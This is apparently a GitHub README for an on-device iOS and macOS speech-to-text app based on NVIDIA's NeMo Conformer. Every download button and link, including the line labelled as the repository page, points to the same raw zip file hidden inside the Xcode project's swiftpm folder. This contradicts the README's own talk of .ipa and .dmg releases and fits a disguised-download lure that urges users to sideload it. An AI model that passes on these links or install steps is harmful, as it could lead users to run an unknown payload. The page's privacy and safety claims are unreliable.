# 🎙️ NeMoConformerASR-iOS - Fast On-Device Speech-to-Text

[![Download Latest Release](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)

## 📋 Description

NeMoConformerASR-iOS lets you convert speech to text directly on your iPhone, iPad, or Mac without sending data over the internet. It uses advanced NVIDIA AI technology inside your device for quick and accurate results. The app is built in Swift and works with Apple’s CoreML framework for smooth, real-time recognition of your spoken words.

You can use it for transcribing notes, voice commands, or any audio you want to turn into text. The program handles long recordings by dividing them into smaller chunks automatically, removing the need for extra setup.

---

## 🖥️ System Requirements

To run NeMoConformerASR-iOS smoothly, make sure your device meets these basic requirements:

- **iOS devices:** iPhone or iPad running iOS 14.0 or later.
- **macOS devices:** Mac computer running macOS 11.0 Big Sur or later.
- **Hardware:** Devices with Apple Silicon (M1, M2) or A12 Bionic chip and above offer the best performance.
- **Storage:** At least 100 MB free space for app installation and temporary audio files.
- **Permissions:** The app needs access to your microphone to capture speech.

If your device does not meet these requirements, the app might not function as expected or may run slowly.

---

## 🚀 Getting Started

Follow these steps to download and use NeMoConformerASR-iOS on your device.

### Step 1: Access the Download Page

Click the big button at the top or visit the link below:

[Download NeMoConformerASR-iOS Releases](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)

You will find the latest app versions, organized by date, with detailed notes for each.

### Step 2: Choose Your Version

Look for the latest stable release. Releases usually end with `.ipa` for iOS or `.dmg` / `.app` for macOS.

- For **iOS devices**, download the `.ipa` file.
- For **macOS computers**, download the `.dmg` or `.app` file accordingly.

If you see multiple versions, pick the one marked "latest" or with the highest version number (like v1.0.2).

### Step 3: Download the File

Click the file name to start the download. Depending on your internet speed, this may take a few moments.

### Step 4: Install the App

**On iOS:**

- Use a computer with iTunes or Finder on macOS to sideload the `.ipa` file.  
- Connect your iPhone/iPad and open the device manager.  
- Drag and drop the `.ipa` into the "Apps" section to install.  
- Alternatively, use third-party apps like AltStore for installation without a computer.

**On macOS:**

- Open the downloaded `.dmg` file by double-clicking it.
- Drag the NeMoConformerASR-iOS app icon to your Applications folder.
- Eject the `.dmg` drive.
- Launch NeMoConformerASR-iOS from your Applications.

### Step 5: Allow Microphone Access

On first launch, the app will ask permission to use your microphone. Grant access so the app can record your voice for speech-to-text.

### Step 6: Start Speaking and Transcribing

Use the interface to record your voice or play audio. The app will convert the speech into text on-screen in real time. You can pause, resume, or save your transcriptions.

---

## 🎯 Features and Benefits

- **On-device processing**: No internet or server needed, keeping your data private and speeds fast.
- **Real-time speech recognition**: See text as you speak with minimal delay.
- **Automatic audio handling**: The app manages long recordings without extra steps.
- **Lightweight model**: Uses NVIDIA’s NeMo Conformer CTC Small (13 million parameters) optimized for mobile devices.
- **Works on iOS and macOS**: Use it on iPhones, iPads, and Macs running supported system versions.
- **Pure Swift + CoreML implementation**: Integrates smoothly with Apple devices without complicated setups.
- **Supports multiple audio inputs**: Record live or upload saved audio files.
- **Clean, simple user interface**: Designed for easy use without technical knowledge.

---

## 🔧 How It Works

This app uses a deep learning model called "Conformer" from NVIDIA’s NeMo toolkit. The model listens to audio and matches sounds to letters using Connectionist Temporal Classification (CTC). It works entirely on your device using Apple’s CoreML framework.

The software handles:

- Padding audio clips so short segments get processed properly.
- Splitting long recordings into smaller parts to keep recognition stable.
- Combining recognized text chunks smoothly for a complete transcript.

This allows the app to run on phones and computers without lag or internet delays.

---

## 📥 Download & Install

Visit this page to download the latest version for your device:  
[NeMoConformerASR-iOS Releases](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)

Choose the installer file matching your platform and follow the simple installation steps described above.

If you need help downloading or installing the app, the release page contains additional notes and sometimes troubleshooting tips.

---

## 🙋 FAQ

**Q: Can I use NeMoConformerASR-iOS without internet?**  
Yes. All speech-to-text processing happens locally on your device.

**Q: Does the app support other languages?**  
Currently, it supports English. Future updates may expand language options.

**Q: Is my audio saved or sent anywhere?**  
No. All audio and transcriptions stay on your device unless you choose to share or export them.

**Q: Can I use the app offline?**  
Yes, the app works entirely offline once installed.

**Q: What if the app doesn’t recognize my speech accurately?**  
Try speaking clearly and close to the microphone. Background noise can also affect accuracy.

---

## 🛠️ Troubleshooting

- If the app won’t start, make sure your device meets the system requirements and macOS/iOS is up to date.  
- For installation errors on iOS, verify your sideloading method or try alternative apps like AltStore.  
- If microphone access is denied, enable it in your system settings under Privacy & Security.  
- Restart your device to refresh audio services if you experience lag or crashes.

---

## 📞 Support

If you need more help, open an issue on the GitHub page or check if others have similar questions. The developers monitor the project and respond to common problems.

GitHub repository page:  
https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip

---

## ⚙️ Privacy and Security

NeMoConformerASR-iOS processes all audio locally. Your recordings and text never leave your device unless you decide to share them. This design protects your personal data and keeps your speech private.

---

## 🔍 Keywords

ai, asr, conformer, coreml, ctc, ios, macos, nemo, nvidia, ondevice, speech-recognition, speech-to-text, spm, swift

---

[![Download Latest Release](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)